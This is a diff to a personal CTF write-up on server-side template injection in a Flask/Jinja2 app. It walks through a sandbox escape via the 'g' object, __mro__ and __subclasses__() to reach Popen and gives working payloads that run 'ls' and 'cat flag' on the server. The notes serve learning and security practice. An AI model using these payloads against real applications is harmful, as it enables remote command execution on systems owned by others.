@@ -38,7 +38,41 @@
 
 - Before we deep dive rad this [Exploiting server-side template injection vulnerabilities | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection/exploiting)
 
-- 
+- Now here we know we are fighting jinja2 template engine. best way to learn is to look for common vulnerabilities and look through the documentation.
+
+- In my research I found out about template variable. There are a few but only few were necessary. Now the jinja2 template runs on a sandbox and we need a way to get out of that sandbox. Something that can talk to the underlying os.
+
+- In flask apps there is a special variable `g` to store information during a request that means it holds the ability to reference few other variables too one of which might have a function that can make a call outside the sandbox.
+
+
+
+**TODO: learn more here**
+
+- then `__class__` this returns class of an object.
+
+- `__mro__` returns base class of a class.
+
+- `__subclasses__()` is a method that list all the subclasses of a class.
+
+- so now chain them together. `{{ g.__class__.__mro__[1].__subclasses__()}}`
+  
+  - `g.__class__` gives us the `<class 'object'>`
+  
+  - `g.__class__.__mro__` give `<class 'object'>, <class 'object'>`
+  
+  - we take the second object and look at the subclasses it has. `g.__class__.__mro__.__subclasses__()` this gives us a shit ton of function available.
+  
+  - I searched for `os`, `open`, `path`, `IO` and similar names.
+  
+  - then I found out the function `popen` and read about it. Then I searched for which comma was after it, it was 357 so `popen` was at 356th location.
+  
+  - `g.__class__.__mro__[1].__subclasses__()[356]('ls')` and it returned the address of the answer. Now we need to convert it to data.
+  
+  - We use communicate for that and some extra arguments. 
+  
+  - `g.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate()[0]` this show all the files in the current folder and there is a file named flag.
+  
+  - `g.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]` this gives us the actual flag and voila.
 
 ---
 
@@ -65,5 +99,3 @@
 - Save this, install python and run it.
 
 - Now what ever you pass in the arguments `c=...`will be executed by the server
-
-- `{{g.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]}}`.
